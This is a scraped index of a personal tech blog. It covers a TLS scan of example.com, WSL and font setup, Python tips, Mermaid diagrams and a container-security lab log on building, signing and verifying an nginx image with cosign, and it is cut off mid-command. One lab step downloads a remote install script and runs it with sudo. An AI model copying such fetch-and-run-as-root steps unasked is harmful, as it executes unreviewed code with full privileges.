XP No connection IE 8 Win 7 TLSv1.0 ECDHE-RSA-AES128-SHA 256 bit ECDH (P-256) IE 8 XP No connection IE 11 Win 7 TLSv1.2 DHE-RSA-AES128-GCM-SHA256 2048 bit DH IE 11 Win 8.1 TLSv1.2 DHE-RSA-AES128-GCM-SHA256 2048 bit DH IE 11 Win Phone 8.1 TLSv1.2 ECDHE-RSA-AES128-SHA256 256 bit ECDH (P-256) IE 11 Win 10 TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Edge 15 Win 10 TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Edge 101 Win 10 21H2 TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Safari 12.1 (iOS 12.2) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Safari 13.0 (macOS 10.14.6) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Safari 15.4 (macOS 12.3.1) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Java 7u25 TLSv1.0 ECDHE-RSA-AES128-SHA 256 bit ECDH (P-256) Java 8u161 TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Java 11.0.2 (OpenJDK) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Java 17.0.3 (OpenJDK) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) go 1.17.8 TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) LibreSSL 2.8.3 (Apple) TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) OpenSSL 1.0.2e TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) OpenSSL 1.1.0l (Debian) TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) OpenSSL 1.1.1d (Debian) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) OpenSSL 3.0.3 (git) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Apple Mail (16.0) TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Thunderbird (91.9) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Rating (experimental) Rating specs (not complete) SSL Labs\u0026#39;s \u0026#39;SSL Server Rating Guide\u0026#39; (version 2009q from 2020-01-30) Specification documentation https://github.com/ssllabs/research/wiki/SSL-Server-Rating-Guide Protocol Support (weighted) 95 (28) Key Exchange (weighted) 90 (27) Cipher Strength (weighted) 90 (36) Final Score 91 Overall Grade B Grade cap reasons Grade capped to B. TLS 1.1 offered Grade capped to B. TLS 1.0 offered Grade capped to A. HSTS is not offered Done 2023-08-04 02:35:14 [ 318s] --\u0026gt;\u0026gt; 93.184.216.34:443 (example.com) \u0026lt;\u0026lt;-- Links # Getting started with Podman Podman Cheat Sheet Getting Started with Podman How to Install Podman on Ubuntu nuclei testssl.sh Docker Alternative with Podman, Cockpit, and Nginx Proxy Manager podman_101 ","date":"2023-08-04 10:34","externalUrl":null,"permalink":"/posts/podman_101/","section":"posts","summary":"Docker alternative with Podman.","title":"Podman 101","type":"posts"},{"content":"","date":"2023-08-03 11:29","externalUrl":null,"permalink":"/tags/config/","section":"tags","summary":"","title":"config","type":"tags"},{"content":" Windows Subsystem for Linux # There are 2 config files in WSL.\nwsl.conf - per-distribution basis .wslconfig - globally across all WSL 2 distributions Config: /etc/wsl.conf # located at /etc/ folder within the distribution. per-distribution basis [boot] systemd = true #command = service docker start [user] default = xx [network] hostname = wslpf generateHosts = false generateResolvConf = false [automount] #enabled = true #mountFsTab = true #root = /mnt #options = [interop] #enabled = true #appendWindowsPath = true Config: %UserProfile%.wslconfig # located at %UserProfile%\\ (usually c:\\Users\\\u0026lt;UserLogin\u0026gt;) folder within Windows OS. contains global configuration for all WSL distributions. [wsl2] memory=4GB processors=4 #memory=16GB #processors=8 Links # Advanced settings configuration wsl-config.md ","date":"2023-08-03 11:29","externalUrl":null,"permalink":"/posts/wsl/","section":"posts","summary":"Advanced settings configuration in WSL.","title":"Windows Subsystem for Linux","type":"posts"},{"content":"","date":"2023-08-03 11:29","externalUrl":null,"permalink":"/tags/wsl/","section":"tags","summary":"","title":"wsl","type":"tags"},{"content":"Python 3.6 introduced, formatted string literals, often referred to as f-strings as another method to help format strings. It is simpler to prepend an f to the string then append .format().\nFormat String (f-string) # These are the basic f-string formatting that I use commonly in Python scripting.\n## Basic: Formatting/Value/Output ## https://github.com/myseq/notes/blob/main/Python/f-string.md Formatting | Value | Output ================================================ {num:0\u0026gt;2d} | 5 | num = 05 {num:,} | 5000000 | num = 5,000,000 {num:.2e} | 5000000 | num = 5.00e+06 (\u0026#34;%.2f\u0026#34; % pi) | 3.141592654 | pi = 3.14 \u0026#34;{:.2f}\u0026#34;.format(pi) | 3.141592654 | pi = 3.14 {:.2f} | 3.141592654 | pi = 3.14 {:+.2f} | 3.141592654 | pi = +3.14 {:.0f} | 3.141592654 | pi = 3 {num:.2%} | 0.25 | num = 25.00% {num:\u0026gt;10} | 0.25 | num = 0.25 {num:\u0026lt;10} | 0.25 | num = 0.25 {num:^10} | 0.25 | num = 0.25 {num:0\u0026gt;9} | 0.25 | num = 000000.25 \u0026#39;{0} \u0026gt;= {1}\u0026#39;.format(\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;) | A \u0026gt;= B \u0026#39;{1} \u0026lt;= {0}\u0026#39;.format(\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;) | B \u0026lt;= A \u0026#39;%s loves %s\u0026#39;% (\u0026#39;cats\u0026#39;,\u0026#39;dogs\u0026#39;) | cats loves dogs \u0026#39;{} hates {}\u0026#39;.format(\u0026#39;cats\u0026#39;,\u0026#39;dogs\u0026#39;) | cats hates dogs {now:%Y-%m-%d %H:%M} | now() = 2023-07-21 17:20 {today:%Y-%m-%d %H:%M} | today() = 2023-07-21 17:20 {utcnow:%Y-%m-%d %H:%M} | utcnow() = 2023-07-21 09:20 email_f = \u0026#34;Your email address is {email}\u0026#34;.format email_address = \u0026#34;_user@example.com_\u0026#34; \u0026#34;Your email address is _user@example.com_\u0026#34; Debugging # To print the variable name togather with the result.\nvar = \u0026#39;text\u0026#39; print(f\u0026#39;{var =}\u0026#39;) Links # Python f-string formatting cheat sheet source code ","date":"2023-08-02 10:59","externalUrl":null,"permalink":"/posts/f-string/","section":"posts","summary":"Using f-string in Python.","title":"Use of f-string format() in Python","type":"posts"},{"content":" About Mermaid # Mermaid allow us to create diagrams and visualizations using merely text and code.\nIt is a JavaScript-based diagramming tool that renders Markdown-inspired text definitions to create diagram easily.\nIf you are familiar with Markdown you should have no problem learning Mermaid.\nMermaid Themes # Mermaid supports different themes at site-wide or individual diagram.\nFor site-wide theme customization, the initialize call is used. For diagram specific customization, the init directive is used.\nHere are the available themes:\ndefault - default theme. neutral - black/white theme that suitable for printing. dark - dark-colored that suit for blog or web site. forest - green-shared theme if you like it. base - the only theme that can be modified and customization. Site-wide Theme # mermaidAPI.initialize({ securityLevel: \u0026#39;loose\u0026#39;, theme: \u0026#39;base\u0026#39;, }); Diagram-specific Theme # %%{init: {\u0026#39;theme\u0026#39;:\u0026#39;forest\u0026#39;}}%% graph LR a --\u0026gt; b b --\u0026gt; a linkStyle 0 stroke:white linkStyle 1 stroke:yellow %%{init: {'theme':'forest'}}%% graph LR a --\u003e b b --\u003e a linkStyle 0 stroke:white linkStyle 1 stroke:yellow Hugo + Mermaid # Simply follow the instruction at Hugo\u0026rsquo;s Diagram.\nUpgrade to Hugo v0.93.0 and above. It supports GoAT and Mermaid diagrams. Make sure to turn on Mermaid at the front matter.\ntoml mermaid = true Update:\nSince I migrated to blowfish theme, to insert Mermaid diagram, use the shortcodei as below. {{\u0026lt; mermaid \u0026gt;}} graph LR; A[Lemons]--\u0026gt;B[Lemonade]; B--\u0026gt;C[Profit] {{\u0026lt; /mermaid \u0026gt;}} Links # Mermaid Cheat Sheet About Mermaid Mermaid Tutorial Mermaid Theme Configuration Mermaid Live Editor Mermaid online Live Editor ","date":"2023-07-24 06:09","externalUrl":null,"permalink":"/posts/diagram_with_mermaid/","section":"posts","summary":"Create diagrams and visualizations using text and code.","title":"Diagramming with Mermaid","type":"posts"},{"content":"","date":"2023-07-24 06:09","externalUrl":null,"permalink":"/tags/mermaid/","section":"tags","summary":"","title":"mermaid","type":"tags"},{"content":" Just leant that Python does support chained comparison. In Python, using chained comparison operators is a way to simplify multiple comparison and thus more efficient.\nComparisons # # comparison operators comparisons = [ \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;=\u0026#39;, \u0026#39;\u0026gt;=\u0026#39;, \u0026#39;==\u0026#39;, \u0026#39;!=\u0026#39;, \u0026#39;is\u0026#39;, \u0026#39;is not\u0026#39;, \u0026#39;in\u0026#39;, \u0026#39;not in\u0026#39; ] Chained_Comparison # I didn\u0026rsquo;t know that Python does support chained comparison until today.\nI used to do this in the past:\ndef main(): x, y, z = 0, 1, 2 if x \u0026lt; y and y \u0026lt; z: print(True) else: print(False) By using chained comparison, I can simply do this way:\ndef main(): x, y, z = 0, 1, 2 if x \u0026lt; y \u0026lt; z: print(True) else: print(False) The difference between the two methods above is, the y is evaluated only once (in method 2).\n","date":"2023-07-12 15:27","externalUrl":null,"permalink":"/posts/chained_comparison/","section":"posts","summary":"Chained comparison in Python.","title":"Chained Comparison","type":"posts"},{"content":"Here is the step how I customize my shell font in Linux.\nDownload fonts # Download Noto Sans Mono font from Google Fonts\nThen, download Cascadia Code font from Microsoft.\n$ wget https://github.com/microsoft/cascadia-code/releases/download/v2111.01/CascadiaCode-2111.01.zip Installing Fonts # $ cd /usr/share/fonts $ sudo mkdir microsoftfonts $ cd microsoftfonts $ sudo unzip -d . ~/CascadiaCode-2111.01.zip $ sudo chmod -R --reference=/usr/share/fonts/opentype /usr/share/fonts/microsoftfonts $ cd /usr/share/fonts $ sudo mkdir googlefonts $ cd googlefonts $ sudo unzip -d . ~/Noto_Sans_Mono.zip $ sudo chmod -R --reference=/usr/share/fonts/opentype /usr/share/fonts/googlefonts Register Fonts # $ sudo fc-cache -fv Check Fonts Installed # $ fc-match NonoSansMono NotoSansMono-VariableFont_wdth,wght.ttf: \u0026#34;Noto Sans Mono\u0026#34; \u0026#34;Regular\u0026#34; $ fc-match CascadiaCode CascadiaCode.ttf: \u0026#34;Cascadia Code\u0026#34; \u0026#34;Regular\u0026#34; Change Fonts # Debian/Ubuntu # $ sudo dpkg-reconfigure console-setup Linux Console # Edit the file /etc/default/console-setup:\n# CONFIGURATION FILE FOR SETUPCON # Consult the console-setup(5) manual page. ACTIVE_CONSOLES=\u0026#34;/dev/tty[1-6]\u0026#34; CHARMAP=\u0026#34;UTF-8\u0026#34; CODESET=\u0026#34;Uni2\u0026#34; #FONTFACE=\u0026#34;Fixed\u0026#34; FONTFACE=\u0026#34;Noto Sans Mono\u0026#34; FONTSIZE=\u0026#34;8x16\u0026#34; VIDEOMODE= # The following is an example how to use a braille font # FONT=\u0026#39;lat9w-08.psf.gz brl-8x8.psf\u0026#39; ","date":"2023-07-10 19:05","externalUrl":null,"permalink":"/posts/shell_fonts/","section":"posts","summary":"Deploy new fonts for Linux shell.","title":"Linux Shell Fonts","type":"posts"},{"content":"","date":"2023-06-21 18:00","externalUrl":null,"permalink":"/tags/music/","section":"tags","summary":"","title":"music","type":"tags"},{"content":" 傳達情感，才是音樂中最重要的元素。 音感 # 音感，音樂的感覺，主要有兩種：小調和大調。同時也是音樂調性的兩種主要分類，它們在音樂中具有不同的情感和音樂感覺。以下是它們的主要區別：\n大調：\n大調音樂基於一個特定的音階，稱為大調音階。這種音階的音符之間有一定的音程（音符之間的距離），使其聽起來較為明亮和愉快。 大調通常被認為是快樂、明亮、輕鬆、開放和愉快的。它經常用於表達喜悅、光明、希望和快樂的情感。 小調：\n小調音樂基於另一個特定的音階，稱為小調音階。這種音階的音符之間的音程較短，使其聽起來較為憂鬱和深沉。 小調通常被認為是嚴肅、憂鬱、情感深沉和悲傷的。它經常用於表達沉思、悲傷、內省和複雜情感。 總之，大調和小調之間的區別，在於它們所基於的音階結構和音符之間的音程，以及它們所傳達的情感。這兩者都是音樂中非常重要的元素，並可用來傳達各種情感和音樂主題。\n音調 # 不同的音樂調性，或音調，是可以傳達不同的情感和音樂感覺，這是音樂理論中的一個重要概念。以下是一些常見音樂調性的一般情感描述，請注意這只是一個大致的參考，實際音樂中的情感可能因樂曲的調性、速度、旋律等因素而有所不同：\nA大調：通常被認為明亮、開放、快樂和愉快。這是一個常見的音樂調性，用於表達愉快和歡樂的情感。\nC大調：C大調通常被認為清晰、明亮和堅強。它經常被用於表達光明和希望。\nD大調：D大調常被視為歡快、激動人心、英勇和歡愉。這種音調經常在節日和慶典音樂中使用。\nE小調：E小調通常被認為較為嚴肅、沉重和憂鬱。這種音調常用於表達悲傷或情感深沉的情感。\nF小調：F小調也被視為較為沉重和憂鬱，但也可以表達出對沉思和情感表達的需求。\nG大調：G大調通常被認為明快、歡快、活潑和愉悅。這是一個常見的音調，用於表達快樂和輕松的情感。\n值得注意的是，音樂的情感和感覺是一個主觀的體驗，不同人可能會以不同方式感受相同的音樂。此外，作曲家和音樂家有時會通過改變音調、旋律、和弦進行等來營造不同的情感，因此音樂的情感表達不僅僅取決於音調本身，還取決於如何使用這些音調以及其他音樂元素。\n譬如說， 同一首歌曲的音樂感覺：A調和C調通常具有不同的音樂感覺。A調通常被認為更溫暖和富有情感，而C調則可能更明亮和清晰。因此，演奏同一首歌曲時，使用不同調性的口琴，會為音樂賦予不同的情感和風格。\n","date":"2023-06-21 18:00","externalUrl":null,"permalink":"/music/","section":"MySeq","summary":"傳達的情感，才是音樂中最重要的元素。","title":"什麼是『音樂』？","type":"page"},{"content":"","date":"2023-06-21 18:00","externalUrl":null,"permalink":"/categories/%E9%9F%B3%E6%A8%82/","section":"categories","summary":"","title":"音樂","type":"categories"},{"content":"","date":"2023-06-17 15:02","externalUrl":null,"permalink":"/tags/anniversary/","section":"tags","summary":"","title":"anniversary","type":"tags"},{"content":"The World Firefox Day was first celebrated on 15th July 2006.\nOn 17th June 2008, Firefox 3 set a Guinness World Record for the largest number of software downloads. Within 24 hours, the browser was downloaded more than 8 million times. And that is time I downloaded my first Firefox. Since then, I\u0026rsquo;m now a Firefox users.\nSo, today, it marks as the 15th anniversary since my first use Firefox.\n","date":"2023-06-17 15:02","externalUrl":null,"permalink":"/posts/firefox_anniversary/","section":"posts","summary":"Remember my first download of Firefox browser 15 years ago.","title":"My Firefox Anniversary","type":"posts"},{"content":"","date":"2023-06-14 17:01","externalUrl":null,"permalink":"/tags/architect/","section":"tags","summary":"","title":"architect","type":"tags"},{"content":" The architect has been doing their work from a whiteboard, whilst the engineer doing their work from a keyboard.\nThere is difference between normal IT architect and cybersecurity architect. The normal architect thinks about how a system will work together, whilst the cybersecurity architect thinks about how it will fail.\nThe cybersecurity architect has to first understand how the system is going to work, or they won\u0026rsquo;t know how it might fail.\nThey must have that level of understanding, then have to add on to it: what could be possible things that it could go wrong.\nIT Architect Cybersecurity Mindset Let\u0026rsquo;s build a castle! Let\u0026rsquo;s build a moat and drawbridge Problem-solving How can we optimize this? How can we break into this? Tools Hammer, nails, wood Firewall, encryption, IDS Outcome User satisfaction Zero vulnerabilities ","date":"2023-06-14 17:01","externalUrl":null,"permalink":"/mindset/","section":"MySeq","summary":"Differences in Cybersecurity architect mindset.","title":"Cybersecurity Architect Mindset","type":"page"},{"content":"","date":"2023-06-13 06:00","externalUrl":null,"permalink":"/tags/communication/","section":"tags","summary":"","title":"communication","type":"tags"},{"content":" How to speak so that people want to listen. Enjoy this TEDTalk from Julian Treasure, sound consultant.\nIn this useful talk, he demonstrates the how-to\u0026rsquo;s of powerful speaking \u0026ndash; from some handy vocal exercises to tips on how to speak with empathy.\nThis is a talk that might help the world sound more beautiful. The talk comes with subtitles (47 languages), and it is available as How to speak so that people want to listen.\n","date":"2023-06-13 06:00","externalUrl":null,"permalink":"/tedtalk/how_to_speak/","section":"TED Talks","summary":"How to speak so that people want to listen.","title":"How To Speak","type":"tedtalk"},{"content":" Summary # By following the workshop, I learn the steps to create a Docker image (Nginx) from scratch and how to secure it.\nNote that the detail instruction can be found at Container Security 101. Here are the steps that I\u0026rsquo;ve taken at my own lab.\nPreparation # First, I watch the 37min video above.\nThen, I setup my virtual mahcine (with multipass) with the following commands.\nc:\\\u0026gt; multipass launch --cpus 4 --mem 4G --name sans focal Launched: sans Skipping mount due to disabled mounts feature c:\\\u0026gt; multipass shell sans Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Jun 8 20:11:38 +08 2023 System load: 0.89 Processes: 151 Usage of /: 31.1% of 4.67GB Users logged in: 0 Memory usage: 6% IPv4 address for eth0: 172.23.72.152 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status New release \u0026#39;22.04.2 LTS\u0026#39; available. Run \u0026#39;do-release-upgrade\u0026#39; to upgrade to it. To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. ubuntu@sans:~$ free -h total used free shared buff/cache available Mem: 3.8Gi 216Mi 3.2Gi 0.0Ki 488Mi 3.4Gi Swap: 0B 0B 0B ubuntu@sans:~$ Getting Start # First, start with patching the OS, and follow by installing Docker.\nubuntu@sans:~$ if [[ -x \u0026#34;$(which sudo)\u0026#34; ]]; then sudo apt-get update; else su -c \u0026#39;apt-get update\u0026#39;; fi ubuntu@sans:~$ if [[ -x \u0026#34;$(which sudo)\u0026#34; ]]; then sudo apt-get -y install ca-certificates curl sudo jq; else su -c \u0026#39;apt-get -y install ca-certificates curl sudo jq\u0026#39;; fi ubuntu@sans:~$ curl -fsSL https://get.docker.com -o get-docker.sh ubuntu@sans:~$ sudo sh get-docker.sh ubuntu@sans:~$ exit Re-login again.\nc:\\\u0026gt; multipass shell ubuntu@sans:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ubuntu@sans:~$yy id | grep docker uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd),998(docker) ubuntu@sans:~$ Creating Image # To create a more secure configuration on top of default image.\nCreate the docker file # Create the docker file with more secure configuration by running Nginx web server as non-root user.\nubuntu@sans:~/workshop_user$ cat \u0026lt;\u0026lt; EOF \u0026gt; Dockerfile FROM nginx RUN groupadd --gid 44380 -r webadm \u0026amp;\u0026amp; useradd -r -g webadm -s \u0026#34;/bin/bash\u0026#34; --create-home --uid 44380 webadm USER webadm EOF ubuntu@sans:~/workshop_user$ Inspect the image # Inspect the image and examine the configuration.\nubuntu@sans:~/workshop_user$ docker buildx build -t user-nginx . [+] Building 0.6s (6/6) FINISHED =\u0026gt; [internal] load .dockerignore 0.0s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load build definition from Dockerfilei 0.0s =\u0026gt; =\u0026gt; transferring dockerfile: 169B 0.0s =\u0026gt; [internal] load metadata for docker.io/library/nginx:latest 0.0s =\u0026gt; CACHED [1/2] FROM docker.io/library/nginx 0.0s =\u0026gt; [2/2] RUN groupadd --gid 44380 -r webadm \u0026amp;\u0026amp; useradd -r -g webadm -s \u0026#34;/bin/bash\u0026#34; --create-home --uid 44380 webadm 0.3s =\u0026gt; exporting to image 0.1s =\u0026gt; =\u0026gt; exporting layers 0.1s =\u0026gt; =\u0026gt; writing image sha256:f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5 0.0s =\u0026gt; =\u0026gt; naming to docker.io/library/user-nginx 0.0s ubuntu@sans:~/workshop_user$ docker inspect user-nginx | jq -r \u0026#39;.[].Config.User\u0026#39; webadm ubuntu@sans:~/workshop_user$ Signing Image # Signing the image allows us to create cryptographic signature using a private key. Then we can assiciate the signature with the image created (user-nginx).\nInspect the image\u0026rsquo;s digest # ubuntu@sans:~$ docker images --digests user-nginx REPOSITORY TAG DIGEST IMAGE ID CREATED SIZE user-nginx latest \u0026lt;none\u0026gt; f997a2fff55b 17 minutes ago 157MB ubuntu@sans:~$ ubuntu@sans:~$ docker inspect --format=\u0026#39;{{index .RepoDigests 0}}\u0026#39; nginx nginx@sha256:af296b188c7b7df99ba960ca614439c99cb7cf252ed7bbc23e90cfda59092305 ubuntu@sans:~$ Setup local registry # ubuntu@sans:~$ newdir=$(mktemp -d) ubuntu@sans:~$ mkdir -p \u0026#34;${newdir}/certs\u0026#34; ubuntu@sans:~$ pushd \u0026#34;${newdir}/certs\u0026#34; /tmp/tmp.GGuPfpUGYM/certs ~ ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker volume create workshop-certs workshop-certs ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker container create --name dummy -v workshop-certs:/certs registry:2 Unable to find image \u0026#39;registry:2\u0026#39; locally 2: Pulling from library/registry 8a49fdb3b6a5: Pull complete 58116d8bf569: Pull complete 4cb4a93be51c: Pull complete cbdeff65a266: Pull complete 6b102b34ed3d: Pull complete Digest: sha256:20d084723c951e377e1a2a5b3df316173a845e300d57ccdd8ae3ab2da3439746 Status: Downloaded newer image for registry:2 10fc426a3bc4f283ed8abc67446f48bbbcac77dd6c191054da34e5dc004c5466 ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ Setup the private key # Create the private and public keys pair.\nubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 60 -nodes -subj \u0026#34;/CN=registry\u0026#34; Generating a RSA private key ...................................................................................................................................................................++++ .................................++++ writing new private key to \u0026#39;key.pem\u0026#39; ----- ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker cp cert.pem dummy:/certs/cert.pem Successfully copied 3.58kB to dummy:/certs/cert.pem ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker cp key.pem dummy:/certs/key.pem Successfully copied 5.12kB to dummy:/certs/key.pem Run a dummy registry for container # ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker run -d -p 443:443 --name registry -v workshop-certs:/certs -e REGISTRY_HTTP_ADDR=0.0.0.0:443 -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/cert.pem -e REGISTRY_HTTP_TLS_KEY=/certs/key.pem registry:2 51d7dc5d5604591760db6ebcfd0b0836e6029877d1a95a466d01d7cfc50d4f88 ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ popd ~ ubuntu@sans:~$ Publish image to registry # ubuntu@sans:~$ docker tag user-nginx:latest localhost:443/user-nginx ubuntu@sans:~$ ubuntu@sans:~$ docker push localhost:443/user-nginx Using default tag: latest The push refers to repository [localhost:443/user-nginx] f5a95857a28b: Pushed 4fd834341303: Pushed 5e099cf3f3c8: Pushed 7daac92f43be: Pushed e60266289ce4: Pushed 4b8862fe7056: Pushed 8cbe4b54fa88: Pushed latest: digest: sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 size: 1780 ubuntu@sans:~$ ubuntu@sans:~$ docker inspect --format=\u0026#39;{{index .RepoDigests 0}}\u0026#39; user-nginx localhost:443/user-nginx@sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 ubuntu@sans:~$ Signing Image # To sign the image, we need to:\nsetup cosign docker image setup docker networking for cosign and registry container generate encrypted keypair with cosign Setup cosign # ubuntu@sans:~$ docker pull cgr.dev/chainguard/cosign Using default tag: latest latest: Pulling from chainguard/cosign 000b45127bba: Pull complete Digest: sha256:04f7bd12328389337fba7c29c2e6140e1585a539528188ef1428caf7f94a02ae Status: Downloaded newer image for cgr.dev/chainguard/cosign:latest cgr.dev/chainguard/cosign:latest ubuntu@sans:~$ docker network create workshop 63a4a8341bfd21936113d21a02d53f2dde7de789fbae9640e2e69a471eb8e0a2 ubuntu@sans:~$ docker network connect workshop registry ubuntu@sans:~$ export COSIGN_PASSWORD=\u0026#39;example\u0026#39; ubuntu@sans:~$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v \u0026#34;$(pwd):/app\u0026#34; -w /app cgr.dev/chainguard/cosign generate-key-pair Private key written to cosign.key Public key written to cosign.pub ubuntu@sans:~$ Signed image # With the keypair, we can signed the manifest digest of localhost:443/user-nginx image, and push the signature to local registry.\nubuntu@sans:~$ image_digest=\u0026#34;$(docker inspect --format=\u0026#39;{{index .RepoDigests 0}}\u0026#39; localhost:443/user-nginx | cut -f2 -d@ )\u0026#34; ubuntu@sans:~$ ubuntu@sans:~$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v \u0026#34;$(pwd):/app\u0026#34; -w /app cgr.dev/chainguard/cosign sign --yes --key cosign.key -a tag=latest registry:443/user-nginx@\u0026#34;${image_digest}\u0026#34; --allow-insecure-registry The sigstore service, hosted by sigstore a Series of LF Projects, LLC, is provided pursuant to the Hosted Project Tools Terms of Use, available at https://lfprojects.org/policies/hosted-project-tools-terms-of-use/. Note that if your submission includes personal data associated with this signed artifact, it will be part of an immutable record. This may include the email address associated with the account with which you authenticate your contractual Agreement. This information will be used for signing this artifact and will be stored in public transparency logs and cannot be removed later, and is subject to the Immutable Record notice at https://lfprojects.org/policies/hosted-project-tools-immutable-records/. By typing \u0026#39;y\u0026#39;, you attest that (1) you are not submitting the personal data of any other person; and (2) you understand and agree to the statement and the Agreement terms at the URLs listed above. tlog entry created with index: 23229082 Pushing signature to: registry:443/user-nginx ubuntu@sans:~$ Verify the signature # With return code and 0, it means everything works.\nubuntu@sans:~$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v \u0026#34;$(pwd):/app\u0026#34; -w /app cgr.dev/chainguard/cosign verify --key cosign.pub registry:443/ user-nginx@\u0026#34;${image_digest}\u0026#34; --allow-insecure-registry Verification for registry:443/user-nginx@sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 -- The following checks were performed on each of these signatures: - The cosign claims were validated - Existence of the claims in the transparency log was verified offline - The signatures were verified against the specified public key [{\u0026#34;critical\u0026#34;:{\u0026#34;identity\u0026#34;:{\u0026#34;docker-reference\u0026#34;:\u0026#34;registry:443/user-nginx\u0026#34;},\u0026#34;image\u0026#34;:{\u0026#34;docker-manifest-digest\u0026#34;:\u0026#34;sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250\u0026#34;},\u0026#34;type\u0026#34;:\u0026#34;cosign container image signature\u0026#34;},\u0026#34;optional\u0026#34;:{\u0026#34;Bundle\u0026#34;:{\u0026#34;SignedEntryTimestamp\u0026#34;:\u0026#34;MEQCIFH1tTPWlW+Zm5T6SMuAB6mI1FHBD6xViH4+sZaNRqlDAiBzuNUZ3i8fX6yAptNJ3EOvI8ecWFau4dR67zjuLZ49mQ==\u0026#34;,\u0026#34;Payload\u0026#34;:{\u0026#34;body\u0026#34;:\u0026#34;eyJhcGlWZXJzaW9uIjoiMC4wLjEiLCJraW5kIjoiaGFzaGVkcmVrb3JkIiwic3BlYyI6eyJkYXRhIjp7Imhhc2giOnsiYWxnb3JpdGhtIjoic2hhMjU2IiwidmFsdWUiOiI5MjM4ODg3Y2JjYTJhOGM4MTYyYjIzOGY3NWE5YzQ2N2FlMjBlMDA3NDVhNDhjZjM2MjYzYmI4M2E3OTc1NDk1In19LCJzaWduYXR1cmUiOnsiY29udGVudCI6Ik1FVUNJUURvRGxBTkJoaWd4VEVLK3NLcHY1Vy85MTJseEdzVmVDNGZ2RDdUTGN2cDFRSWdlUUZXb2FieUhYU2VPaWZDWFQrcHRMc0NYMU1kWE1Yd0dPVzIydXlXalA0PSIsInB1YmxpY0tleSI6eyJjb250ZW50IjoiTFMwdExTMUNSVWRKVGlCUVZVSk1TVU1nUzBWWkxTMHRMUzBLVFVacmQwVjNXVWhMYjFwSmVtb3dRMEZSV1VsTGIxcEplbW93UkVGUlkwUlJaMEZGUVVGMlNuQjVVRWxVY2tJclJUaFJNa2haWms1UFlUQmpSVlp5VVFvNFpGaG9SMXBGWTNwUU5IbHVWMjVGUTJKRlNIWmFVMHRwWkVVM2REQkxUbE54U1VOVFZFbHRTVXRCYjFaMFN6VlRlRE5hUWsxd2IyOTNQVDBLTFMwdExTMUZUa1FnVUZWQ1RFbERJRXRGV1MwdExTMHRDZz09In19fX0=\u0026#34;,\u0026#34;integratedTime\u0026#34;:1686306330,\u0026#34;logIndex\u0026#34;:23229082,\u0026#34;logID\u0026#34;:\u0026#34;c0d23d6ad406973f9559f3ba2d1ca01f84147d8ffc5b8445c224f98b9591801d\u0026#34;}},\u0026#34;tag\u0026#34;:\u0026#34;latest\u0026#34;}}] ubuntu@sans:~$ echo $? 0 ubuntu@sans:~$ Image Security Assessment # To assess an image, we will:\ngenerate the SBOM perform vulnerability scan inspect manually Making SBOM # To generate a Software Bill of Materials (SBOM), and assess the SBOM artifact for any issue.\nThis is effectively how Software Composition Analysis (SCA) tools work.\nPulling the syft Create user-nginx.sbom.json file Identify different artifacts (143) ubuntu@sans:~$ docker run -v 